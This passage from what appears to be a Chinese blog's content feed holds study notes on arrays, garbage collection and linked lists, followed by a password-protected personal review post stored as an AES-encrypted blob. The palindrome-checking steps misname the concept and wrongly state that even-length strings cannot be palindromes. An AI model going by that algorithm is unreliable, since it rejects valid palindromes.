<h4 id="7、容器能否完全替代数组？"><a href="#7、容器能否完全替代数组？" class="headerlink" title="7、容器能否完全替代数组？"></a>7、容器能否完全替代数组？</h4><p>相比于数组，Java中的ArrayList封装了数组的很多操作，并支持动态扩容。扩容时比较消耗内存，因为涉及到内存申请和数据搬移。<br>数组适合的场景：<br>Java ArrayList的使用涉及装箱拆箱，有一定的性能损耗，关注性能，或者希望使用基本类型，就可以选用数组；<br>数据大小事先已知，并且涉及的数据操作非常简单，使用数组；<br>表示多维数组时，数组往往更加直观；<br>业务开发容器即可，底层开发，如网络框架，性能优化。选择数组。</p>
<h4 id="8、标记清除垃圾回收算法："><a href="#8、标记清除垃圾回收算法：" class="headerlink" title="8、标记清除垃圾回收算法："></a>8、标记清除垃圾回收算法：</h4><p>大多数主流虚拟机采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有 GC ROOTS，将所有 GC ROOTS 可达的对象标记为存活。只有当标记工作完成后，清理工作才会开始。<br>不足：1.效率问题。标记和清理效率都不高，但是当知道只有少量垃圾产生时会很高效。2.空间问题。会产生不连续的内存空间碎片。</p>
<h4 id="9、二维数组的内存寻址公式是怎样的呢？"><a href="#9、二维数组的内存寻址公式是怎样的呢？" class="headerlink" title="9、二维数组的内存寻址公式是怎样的呢？"></a>9、二维数组的内存寻址公式是怎样的呢？</h4><p>对于 m <em> n 的二维数组，a [ i ][ j ] (i &lt; m,j &lt; n) 的地址为：<br>address = base_address + ( i </em> n + j) * type_size</p>
<h4 id="10、三维数组："><a href="#10、三维数组：" class="headerlink" title="10、三维数组："></a>10、三维数组：</h4><p>三维数组假设是 m<em>n</em>q， a[i][j][k]_address=base_address + (i<em>n</em>q + j<em>q + k)</em>type_size</p>
<h2 id="06-链表"><a href="#06-链表" class="headerlink" title="06 链表"></a>06 链表</h2><h3 id="1、学习链表有什么用？"><a href="#1、学习链表有什么用？" class="headerlink" title="1、学习链表有什么用？"></a>1、学习链表有什么用？</h3><h4 id="一、基于链表实现-LRU-缓存淘汰算法："><a href="#一、基于链表实现-LRU-缓存淘汰算法：" class="headerlink" title="一、基于链表实现 LRU 缓存淘汰算法："></a>一、基于链表实现 LRU 缓存淘汰算法：</h4><p>我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。</p>
<p>1、如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。</p>
<p>2、如果此数据没有在缓存链表中，又可以分为两种情况：</p>
<ul>
<li><p>如果此时缓存未满，则将此结点直接插入到链表的头部；</p>
</li>
<li><p>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</p>
</li>
</ul>
<h4 id="二、2-如何通过单链表实现“判断某个字符串是否为水仙花字符串”？"><a href="#二、2-如何通过单链表实现“判断某个字符串是否为水仙花字符串”？" class="headerlink" title="二、2.如何通过单链表实现“判断某个字符串是否为水仙花字符串”？"></a>二、2.如何通过单链表实现“判断某个字符串是否为水仙花字符串”？</h4><p>1）前提：字符串以单个字符的形式存储在单链表中。<br>2）遍历链表，判断字符个数是否为奇数，若为偶数，则不是。<br>3）将链表中的字符倒序存储一份在另一个链表中。<br>4）同步遍历2个链表，比较对应的字符是否相等，若相等，则是水仙花字串，否则，不是。</p>
<h3 id="2、什么是链表"><a href="#2、什么是链表" class="headerlink" title="2、什么是链表"></a>2、什么是链表</h3><p>1.和数组一样，链表也是一种线性表。<br>2.从内存结构来看，链表的内存结构是不连续的内存空间，是将一组零散的内存块串联起来，从而进行数据存储的数据结构。<br>3.链表中的每一个内存块被称为节点Node。节点除了存储数据外，还需记录链上下一个节点的地址，即后继指针next。</p>
<h3 id="3、为什么使用链表？"><a href="#3、为什么使用链表？" class="headerlink" title="3、为什么使用链表？"></a>3、为什么使用链表？</h3><p>1.插入、删除数据效率高O(1)级别（只需更改指针指向即可），随机访问效率低O(n)级别（需要从链头至链尾进行遍历）。<br>2.和数组相比，内存空间消耗更大，因为每个存储数据的节点都需要额外的空间存储后继指针。</p>
<h3 id="4、常用链表"><a href="#4、常用链表" class="headerlink" title="4、常用链表"></a>4、常用链表</h3><p>单链表、循环链表、双向链表<br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/%E5%8D%95%E9%93%BE%E8%A1%A81.jpg" alt><br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/%E5%8F%8C%E5%90%91%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.jpg" alt><br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8.jpg" alt><br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.jpg" alt></p>
<h3 id="5、数组与链表的比较"><a href="#5、数组与链表的比较" class="headerlink" title="5、数组与链表的比较"></a>5、数组与链表的比较</h3><p><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/%E6%95%B0%E7%BB%84%E4%B8%8E%E9%93%BE%E8%A1%A8%E6%AF%94%E8%BE%83.jpg" alt></p>
<p>1.插入、删除和随机访问的时间复杂度<br>数组：插入、删除的时间复杂度是O(n)，随机访问的时间复杂度是O(1)。<br>链表：插入、删除的时间复杂度是O(1)，随机访问的时间复杂端是O(n)。<br>链表增删快但是查询比较慢。<br>2.数组缺点<br>1）若申请内存空间很大，比如100M，但若内存空间没有100M的连续空间时，则会申请失败，尽管内存可用空间超过100M。<br>2）大小固定，若存储空间不足，需进行扩容，一旦扩容就要进行数据复制，而这时非常费时的。<br>3.链表缺点<br>1）内存空间消耗更大，因为需要额外的空间存储指针信息。<br>2）对链表进行频繁的插入和删除操作，会导致频繁的内存申请和释放，容易造成内存碎片，如果是Java语言，还可能会造成频繁的GC（自动垃圾回收器）操作。<br>4.如何选择？<br>数组简单易用，在实现上使用连续的内存空间，可以借助CPU的缓冲机制预读数组中的数据，所以访问效率更高，而链表在内存中并不是连续存储，所以对CPU缓存不友好，没办法预读。<br>如果代码对内存的使用非常苛刻，那数组就更适合。</p>
<h3 id="6、缓存："><a href="#6、缓存：" class="headerlink" title="6、缓存："></a>6、缓存：</h3><p>是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的 CPU 缓存、数据库缓存、浏览器缓存等等。</p>
<h3 id="7、小结"><a href="#7、小结" class="headerlink" title="7、小结"></a>7、小结</h3><p>和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过，在具体软件开发中，要对数组和链表的各种性能进行对比，综合来选择使用两者中的哪一个。</p>
<h3 id="8、问题："><a href="#8、问题：" class="headerlink" title="8、问题："></a>8、问题：</h3><p>如何判断一个字符串是否是回文字符串的问题，我想你应该听过，我们今天的思题目就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那该如何来判断是一个回文串呢？你有什么好的解决思路呢？相应的时间空间复杂度又是多少呢？</p>
<h2 id="07链表"><a href="#07链表" class="headerlink" title="07链表"></a>07链表</h2><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这节我主要和你讲了写出正确链表代码的六个技巧。分别是理解指针或引用的含义、警惕指针丢失和内存泄漏、利用哨兵简化实现难度、重点留意边界条件处理，以及举例画图、辅助思考，还有多写多练。</p>
<p>练习题LeetCode对应编号：206，141，21，19，876。<br>参考（C#）：<a href="https://www.cnblogs.com/errornull/p/9860724.html" target="_blank" rel="noopener">https://www.cnblogs.com/errornull/p/9860724.html</a></p>
<h4 id="1、指针或引用的含义"><a href="#1、指针或引用的含义" class="headerlink" title="1、指针或引用的含义"></a>1、指针或引用的含义</h4><p>指针是一个变量，该变量中存的是其它变量的地址。将普通变量赋值给指针变量，其实是把它的地址赋值给指针变量。</p>
<h4 id="2、指针丢失和内存泄漏"><a href="#2、指针丢失和内存泄漏" class="headerlink" title="2、指针丢失和内存泄漏"></a>2、指针丢失和内存泄漏</h4><p>在插入和删除结点时，要注意先持有后面的结点再操作，否者一旦后面结点的前继指针被断开，就无法再访问，导致内存泄漏。</p>
<h4 id="3、利用哨兵简化难度"><a href="#3、利用哨兵简化难度" class="headerlink" title="3、利用哨兵简化难度"></a>3、利用哨兵简化难度</h4><p>链表的插入、删除操作，需要对插入第一个结点和删除最后一个节点做特殊处理。利用哨兵对象可以不用边界判断，链表的哨兵对象是只存指针不存数据的头结点。</p>
<h4 id="4-重点留意边界条件处理"><a href="#4-重点留意边界条件处理" class="headerlink" title="4. 重点留意边界条件处理"></a>4. 重点留意边界条件处理</h4><p>操作链表时要考虑链表为空、一个结点、两个结点、头结点、尾结点的情况。学习数据结构和算法主要是掌握一系列思想，能在其它的编码中也养成考虑边界的习惯。</p>
<h4 id="5-举例画图，辅助思考"><a href="#5-举例画图，辅助思考" class="headerlink" title="5. 举例画图，辅助思考"></a>5. 举例画图，辅助思考</h4><p>对于比较复杂的操作，可以用纸笔画一画，释放脑容量来做逻辑处理（时间换空间思想），也便于完成后的检查。</p>
<h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><ul>
<li><p>单链表反转</p>
</li>
<li><p>链表中环的检测</p>
</li>
<li><p>两个有序的链表合并</p>
</li>
<li><p>删除链表倒数第 n 个结点</p>
</li>
<li><p>求链表的中间结点</p>
</li>
</ul>
<p>用哨兵来简化编码实现，你是否还能够想到其他场景，利用哨兵可以大大地简化编码难度？</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>来一次文字释放（年中复盘）</title>
    <url>/%E6%9D%A5%E4%B8%80%E6%AC%A1%E6%96%87%E5%AD%97%E9%87%8A%E6%94%BE/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙（提示：一个备注名）</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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